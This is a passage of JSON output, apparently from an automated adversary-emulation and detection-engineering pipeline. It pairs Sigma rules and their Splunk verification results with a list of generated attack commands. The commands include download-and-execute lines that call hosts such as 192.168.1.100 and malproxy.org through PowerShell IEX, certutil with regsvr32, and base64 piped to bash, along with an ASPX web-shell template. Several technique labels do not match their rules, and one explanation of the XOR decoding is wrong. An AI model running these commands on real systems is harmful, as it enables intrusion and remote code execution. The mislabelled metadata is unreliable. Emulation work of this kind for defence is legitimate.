          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 304,
          "query_time_ms": 628.0
        }
      },
      {
        "title": "Suspicious Scheduled Task Creation with HTTP Communication",
        "description": "Detects scheduled task creation via schtasks.exe with HTTP indicators associated with Tunna web shell deployment",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains|all": [
              "/tn",
              "/tr"
            ],
            "CommandLine|contains": "http"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system administration using HTTP-based deployment scripts",
          "Automated software update mechanisms fetching resources via HTTP"
        ],
        "level": "high",
        "tags": [
          "attack.t1053.005",
          "attack.execution",
          "attack.t1105"
        ],
        "ttp_id": "unknown",
        "technique_name": "Software Deployment Tools",
        "generation_method": "langchain",
        "id": "a177a58b-40b1-4adb-90a8-cebc1a732b1d",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 280,
          "query_time_ms": 505.0
        }
      },
      {
        "title": "Create or Modify System Process Detection",
        "description": "Detects Create or Modify System Process activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\powershell.exe",
              "\\cmd.exe"
            ],
            "CommandLine|contains|all": [
              "/create",
              "-Action",
              "-Trigger",
              "New-ScheduledTask"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system-initiated process creations",
          "Administrative tasks using PowerShell or cmd.exe"
        ],
        "level": "medium",
        "tags": [
          "attack.persistence",
          "attack.t1562",
          "mitre.create_or_modify_system_process"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "76ee7751-4b40-4551-9eab-b1876fadd242",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Scheduled Task Creation via Multiple Methods",
        "description": "Detects creation of scheduled tasks using schtasks, PowerShell, or WMI command-line tools, indicative of T1053.005",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": null
        },
        "detection": {
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": "/create"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Register-ScheduledTask"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "create"
          },
          "condition": "selection_schtasks or selection_powershell or selection_wmic"
        },
        "falsepositives": [
          "Administrative scripts that create maintenance tasks",
          "Software deployment tools using scheduled tasks",
          "System updates or third-party installers registering update checks"
        ],
        "level": "high",
        "tags": [
          "attack.t1053.005",
          "attack.execution",
          "attack.defense_evasion"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "langchain",
        "id": "420ad135-fc97-466a-b9ba-690a3a5b9363",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Suspicious Data Archiving via Script Hosts",
        "description": "Detects archive operations initiated from potentially malicious parent processes, indicating data collection preparation",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "CommandLine|contains": [
              ".zip",
              "compress",
              "7z",
              "tar",
              ".gz",
              ".rar"
            ]
          },
          "selection2": {
            "ParentImage|endswith": [
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\msbuild.exe",
              "\\svchost.exe"
            ]
          },
          "condition": "selection1 and selection2"
        },
        "falsepositives": [
          "Legitimate administrative scripts performing log archiving",
          "Package deployment tools using compression"
        ],
        "level": "high",
        "tags": [
          "attack.collection",
          "attack.t1560.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "05c5655e-368c-421d-b843-3550ec973449",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Windows Account Discovery via Command Utilities",
        "description": "Detects common command-line utilities used for account discovery, including net.exe and PowerShell user enumeration commands.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "net user",
              "net group",
              "net localgroup",
              "dsquery user"
            ]
          },
          "selection_ps": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Get-LocalUser",
              "Get-ADUser",
              "net user /domain"
            ]
          },
          "condition": "selection_cmd or selection_ps"
        },
        "falsepositives": [
          "Legitimate system administration",
          "User management scripts",
          "IT helpdesk operations"
        ],
        "level": "medium",
        "tags": [
          "attack.t1087",
          "attack.discovery"
        ],
        "ttp_id": "unknown",
        "technique_name": "Account Discovery",
        "generation_method": "langchain",
        "id": "74d16de2-29fe-44bf-a980-d33988a95798",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Scheduled Task Creation via schtasks, PowerShell, or WMIC",
        "description": "Detects creation of scheduled tasks using schtasks.exe with /create, PowerShell Register-ScheduledTask, or WMIC process call create. This technique is used for persistence (T1053.005).",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": null
        },
        "detection": {
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": "/create"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Register-ScheduledTask"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "process call create"
          },
          "condition": "selection_schtasks or selection_powershell or selection_wmic"
        },
        "falsepositives": [
          "Legitimate administrative scripts that create scheduled tasks for maintenance or automation",
          "Endpoint management tools that deploy tasks remotely"
        ],
        "level": "high",
        "tags": [
          "attack.t1053.005",
          "attack.execution",
          "attack.persistence"
        ],
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys",
        "generation_method": "langchain",
        "id": "179236c1-0af1-42a6-ac9d-fc6715c593a8",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Scheduled Task Creation via schtasks.exe, at.exe or PowerShell",
        "description": "Detects creation of scheduled tasks using schtasks.exe, at.exe, or PowerShell Register\u2011ScheduledTask, excluding legitimate system\u2011initiated tasks. Aligns with ATT&CK technique T1053.005 (Scheduled Task Creation).",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": "/create"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Register-ScheduledTask"
          },
          "selection_at": {
            "Image|endswith": "\\at.exe"
          },
          "selection_system_user": {
            "User|endswith": "SYSTEM"
          },
          "selection_parent_svchost": {
            "ParentImage|endswith": "\\svchost.exe"
          },
          "condition": "(selection_schtasks or selection_powershell or selection_at) and not selection_system_user and not selection_parent_svchost"
        },
        "falsepositives": [
          "Legitimate scheduled task creation by administrators using schtasks.exe or PowerShell for maintenance.",
          "System updates that create tasks via svchost.exe (excluded by parent process filter).",
          "Automation scripts run under privileged accounts that intentionally create tasks."
        ],
        "level": "medium",
        "tags": [
          "attack.t1053.005",
          "attack.lateral_movement",
          "custom.windows",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Desktop Protocol",
        "generation_method": "langchain",
        "id": "f7be34ad-ace6-4e71-bd8c-4bcc5829829c",
        "siem_verification": {
          "detected": false,
          "status": "error",
          "message": "Splunk query failed: HTTP 503",
          "events_found": 0,
          "query_time_ms": 0
        }
      },
      {
        "title": "Office Application Spawning Command Shell with Suspicious Parameters",
        "description": "Detects phishing payload execution via Office applications spawning command shells with suspicious command-line arguments",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "EventID": 1,
            "ParentImage|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": [
              "-EncodedCommand",
              "Invoke-WebRequest",
              "DownloadString"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate Office macros using PowerShell for automation",
          "Administrative scripts initiated from Office applications"
        ],
        "level": "high",
        "tags": [
          "attack.t1566"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "49fecd96-257b-42b8-a422-00866c918f7b",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 132,
          "query_time_ms": 610.0
        }
      }
    ],
    "status": "success"
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "average_quality_score": 0.6397058823529411
    }
  },
  "attacks": [
    {
      "id": "65e3984f-3f5c-4d9c-bce8-dca73da64f3e",
      "ttp_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100/tunna.aspx C:\\Windows\\Temp\\tunna.aspx",
      "description": "Download a Tunna web shell proxy script from a remote server using built-in certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a web shell file (simulated) to the temp directory. No execution occurs. Uses common admin tool for stealth.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.216281",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.746,
      "validated": true
    },
    {
      "id": "adc5d2ba-39cf-42ac-868b-78afe0de7bb2",
      "ttp_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/tunna.ps1'); Start-Tunnel -LocalPort 3389 -RemoteHost 10.0.0.5 -RemotePort 3389 -Url http://192.168.1.100/tunna.aspx\"",
      "description": "Download and execute a Tunna-like PowerShell script to create an HTTP tunnel from local RDP port to a remote target",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Simulates tunneling of RDP traffic over HTTP by invoking a remote script that sets up port forwarding. The script would connect back via HTTP to relay traffic.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.216281",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.746,
      "validated": true
    },
    {
      "id": "ceb9c2ec-ce0e-4aec-b389-3afb292fb6bc",
      "ttp_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\_tunna' -ErrorAction SilentlyContinue; $wc = New-Object Net.WebClient; $wc.DownloadFile('http://192.168.1.100/tunna.exe', '%TEMP%\\_tunna\\proxy.exe'); Start-Process '%TEMP%\\_tunna\\proxy.exe' -ArgumentList '/connect /L:8080 /R:10.0.0.10:443 /U:http://malproxy.org/tunna.aspx' -WindowStyle Hidden\"",
      "description": "Download a Tunna binary proxy executable and run it to forward local traffic over HTTP to a remote system",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a temporary directory, downloads a proxy executable (simulated), and runs it hidden to tunnel traffic from local port 8080 to a remote host over HTTP. Mimics advanced usage with background execution.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.216281",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.746,
      "validated": true
    },
    {
      "id": "82237ff1-e81a-4815-8307-bbf453002d31",
      "ttp_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "ssh -D 1080 -N -f attacker@proxy-server.example.com",
      "description": "Establish a SOCKS5 proxy tunnel using SSH dynamic port forwarding on port 1080",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a background SOCKS proxy on localhost:1080, routing traffic through the SSH server. Applications can be configured to use this proxy for C2-like traffic tunneling over SSH.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.448192",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.746,
      "validated": true
    },
    {
      "id": "a6ecf2a4-917c-49f7-b977-ef4d03bfa006",
      "ttp_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "curl --proxy http://localhost:8080 http://target.internal/service",
      "description": "Use curl to make an HTTP request through a local proxy (e.g., one established by a tunneled connection)",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends an HTTP request to an internal service via a local proxy on port 8080, simulating access through a tunneled connection. No data exfiltration occurs; the target is benign.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.448192",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.746,
      "validated": true
    },
    {
      "id": "77074420-f66a-4957-bc06-54f7625294ad",
      "ttp_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_id": "e4f2df45-fd9f-404f-a7d6-e9c81b175172",
      "technique_name": "Proxy",
      "tactic": "Command and Control",
      "platform": "linux",
      "command": "nc -l -p 8080 -c 'curl http://internal.api.test'",
      "description": "Start a local listener on port 8080 that forwards incoming connections to an internal API via curl (simulating proxy behavior)",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Listens on port 8080 and executes curl to an internal endpoint when a connection is received, mimicking a reverse proxy setup for tunneling traffic.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.448192",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.746,
      "validated": true
    },
    {
      "id": "56b451b8-830c-495e-b558-62f7596f16e3",
      "ttp_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo test > \"%TEMP%\\\\malicious_webshell.asp\" & start \"\" \"%TEMP%\\\\malicious_webshell.asp\"\"",
      "description": "Simulates user execution of a malicious web shell by creating a benign test file and opening it with the default handler.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a harmless test file named malicious_webshell.asp in the user's TEMP directory and attempts to open it with the default application (e.g., browser or text editor). No actual web server or shell functionality is present.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.843420",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.708,
      "validated": true
    },
    {
      "id": "57f7f5dc-75bb-47de-a618-77007692fb6e",
      "ttp_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f \"http://example.com/stage1.dll\" \"%TEMP%\\\\stage1.dll\" & regsvr32.exe \"%TEMP%\\\\stage1.dll\" /s",
      "description": "Downloads a DLL using certutil and silently registers it with regsvr32 to simulate DLL-based backdoor execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from a URL (fails safely if unreachable) and executes it as a DLL via regsvr32. The /s flag suppresses UI. In a real attack, this would run code in the DLL; here, it would fail harmlessly if the file doesn't exist or isn't a valid DLL.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.843420",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.708,
      "validated": true
    },
    {
      "id": "56bb1d43-8ab8-43d8-ba68-105eaf3ccbc7",
      "ttp_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $payload = 'cmd.exe /c echo UserExecutionTest > \"%TEMP%\\\\uexec_test.log\"'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload)); Start-Process powershell.exe -ArgumentList '-EncodedCommand', $encoded } catch { }\"",
      "description": "Executes a simulated malicious payload via PowerShell EncodedCommand to mimic obfuscated execution of a backdoor.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Encodes a benign command that writes a test log in TEMP, then spawns a new PowerShell process to execute it via -EncodedCommand. This simulates how attackers obfuscate payloads. The command is harmless and does not require admin rights.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:46.843420",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.708,
      "validated": true
    },
    {
      "id": "8bb32f2b-22f1-4760-98a1-ec06af258c1c",
      "ttp_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo 'echo \"Simulated payload execution\" > /tmp/test_output.txt' > /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh",
      "description": "Simulates execution of a downloaded script by writing a benign command to a file, making it executable, and running it",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a script in /tmp that writes a test message to a file when executed",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.924630",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.708,
      "validated": true
    },
    {
      "id": "be452f3b-ea34-4331-8b3b-480cf894c479",
      "ttp_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "cat << 'EOF' > /tmp/backdoor.sh\\n#!/bin/sh\\necho \"User executed payload at $(date)\" >> /tmp/execution.log\\nEOF\\nchmod +x /tmp/backdoor.sh\\nsh /tmp/backdoor.sh",
      "description": "Uses heredoc syntax to write a self-contained shell script that logs execution time, then executes it using sh",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Generates a shell script that appends a timestamped message to a log file and runs it",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.924630",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.708,
      "validated": true
    },
    {
      "id": "0852d0f6-0011-417d-ba95-8bd9ca351e6d",
      "ttp_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_id": "bf0accf8-6ab0-4915-a262-e1aaa9814fd8",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "mkdir -p /tmp/.cache && echo 'echo \"Simulated post-exploitation action\"' > /tmp/.cache/update && chmod +x /tmp/.cache/update && /tmp/.cache/update || echo \"Execution failed\"",
      "description": "Creates a hidden directory in /tmp, places an executable script inside, and runs it with error fallback",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Makes a hidden directory, stores and executes a script, and prints failure message if execution fails",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.924630",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.708,
      "validated": true
    },
    {
      "id": "c966dbcb-b89e-4525-ad36-4a4d997232fe",
      "ttp_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f \"http://192.168.1.100/shell.aspx\" \"%TEMP%\\webshell.aspx\"",
      "description": "Download a simulated web shell using certutil, a built-in Windows binary commonly abused for file downloads.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file named 'webshell.aspx' from a local attacker-controlled server to the user's TEMP directory. No execution occurs. This simulates the retrieval of a web shell after exploitation.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.124307",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.707,
      "validated": true
    },
    {
      "id": "e7f0efa4-d8ae-4314-bbb3-43ebdc2d514f",
      "ttp_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://192.168.1.100/cmd' -Method POST -Body 'cmd=echo hello' -UseBasicParsing; Write-Output 'Command sent.'\"",
      "description": "Simulate interaction with a deployed web shell by sending a POST request with a benign command.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends a POST request to a simulated web shell endpoint with a harmless command (echo hello). Output confirms the request was sent. No actual system impact.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.124307",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.707,
      "validated": true
    },
    {
      "id": "524f9804-bdbe-4840-89e1-5ef6ba2660bc",
      "ttp_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "cmd.exe /c \"echo ^<% Execute(Request(^'cmd^')) %^> > \"%TEMP%\\xslwebshell.aspx\" & certutil.exe -urlcache -split -f http://malicious/site/xsl.txt >> \"%TEMP%\\xslwebshell.aspx\"\"",
      "description": "Create a simulated XSL-based web shell by combining a static ASPX template with downloaded XSL content.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a file 'xslwebshell.aspx' in TEMP by appending downloaded content to a minimal ASPX execution template. This simulates construction of a modified Xsl Exec Shell. No active exploitation occurs.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.124307",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.707,
      "validated": true
    },
    {
      "id": "23ccd2b2-7c3e-4bb8-bdad-4e588078f055",
      "ttp_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "curl -X POST http://localhost:8080/upload.aspx -d '<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\">Test XSL Shell</xsl:template></xsl:stylesheet>'",
      "description": "Basic interaction with a vulnerable XSLT endpoint by sending a benign XSL payload via HTTP POST.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends a test XSL payload to a web server endpoint that may process XSLT. No code execution occurs; used to verify endpoint responsiveness.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:48.675626",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.707,
      "validated": true
    },
    {
      "id": "91ad4be6-1465-4051-a1e6-b265a97a0333",
      "ttp_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "echo '<?xml version=\"1.0\"?>\\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\\n<xsl:template match=\"/\">\\n<xsl:eval>document.write(\\\"XSL Exec Test\\\")</xsl:eval>\\n</xsl:template>\\n</xsl:stylesheet>' > /tmp/test.xsl && curl http://localhost:8080/process.aspx -d @/tmp/test.xsl",
      "description": "Intermediate step: creates a test XSL file with eval directive and sends it to a web processor.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Writes a test XSL file containing an eval directive to /tmp and posts it to a web endpoint. Simulates preparation and delivery of an XSL-based web shell.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:48.675626",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.707,
      "validated": true
    },
    {
      "id": "d836b235-4850-4e5d-9cc4-cd304ba81a28",
      "ttp_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_id": "294961e5-f5e6-47e3-8781-37873dd1717e",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "echo 'ZWNobyAnPHhtbCB2ZXJzaW9uPSIxLjAiPz48eHNsOnN0eWxlc2hlZXQgdmVyc2lvbj0iMS4wIiB4bWxuczp4c2w9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvWE9MVC9UcmFuc2Zvcm0iPjx4c2w6dGVtcGxhdGUgbWF0Y2g9Ii8iPjx4c2w6ZXZhbD5hbGVydChkb2N1bWVudC5kb21haW4pPC94c2w6ZXZhbD48L3hzbDp0ZW1wbGF0ZT48L3hzbDpzdHlsZXNoZWV0PicgPiAvdG1wL21hbGljaW91cy54c2w=' | base64 -d | bash",
      "description": "Advanced: decodes and executes a base64-encoded XSL web shell payload that writes a malicious stylesheet to disk.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes a base64 string containing an echo command that writes a malicious XSL file with executable directives to /tmp. Demonstrates obfuscation and delivery of XSL payloads.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:48.675626",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.707,
      "validated": true
    },
    {
      "id": "76698277-7c6c-4f52-9098-690629a77c43",
      "ttp_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "certutil.exe -decode \"%TEMP%\\encoded.txt\" \"%TEMP%\\decoded.bat\" >nul 2>&1 & start \"\" \"%TEMP%\\decoded.bat\"",
      "description": "Decodes a base64-encoded, XOR-obfuscated batch script using certutil and executes it. Simulates use of common utility for decoding hidden content.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a batch file in %TEMP% that runs a benign command (e.g., echo test) after decoding from base64. Uses certutil, a built-in Windows binary, to decode obfuscated content.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.375769",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "df314aac-6787-4ffd-aea6-7714d5e9c230",
      "ttp_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"$q='ZWNobyB0ZXN0'; $x=1; $d=[char[]]$q|%{[char]([int][char]$_ -bxor $x)}; iex (-join $d)\"",
      "description": "PowerShell command that decrypts a string (XOR with 1) and executes it. Uses obfuscated variable names and basic XOR decryption to hide the command 'echo test'.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decrypts the string 'ZWNobyB0ZXN0' (base64 for 'echo test') using XOR with key 1, then executes the result via iex. Demonstrates string encryption and obfuscation in PowerShell with minimal footprint.",
      "source": "langchain",
      "generated_at": "2025-12-28T14:46:47.375769",
      "agent_id": "688ffbd1-b312-4344-bff6-cf40d562eb88",
      "confidence_score": 0.705,
      "validated": true
    },
    {
      "id": "5aa4a37a-ac2d-495d-8f84-509029519507",
      "ttp_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_id": "0ffced1c-08a2-4504-bb20-5c53fc1c8d45",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\_tmp' -Force -ErrorAction SilentlyContinue; $a='YmFzZTY0LWVuY29kZWQgaGlkZGVuIGRhdGE='; Set-Content -Path '%TEMP%\\_tmp\\a.dat' -Value $a -Force; $b=Get-Content '%TEMP%\\_tmp\\a.dat'; $c=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b)); iex $c\"",
      "description": "Multi-stage obfuscation: stores base64-encoded string in a hidden temp file, reads it, decodes and executes. Simulates layered obfuscation with file storage.",
      "requires_admin": false,
      "safety_level": "medium",
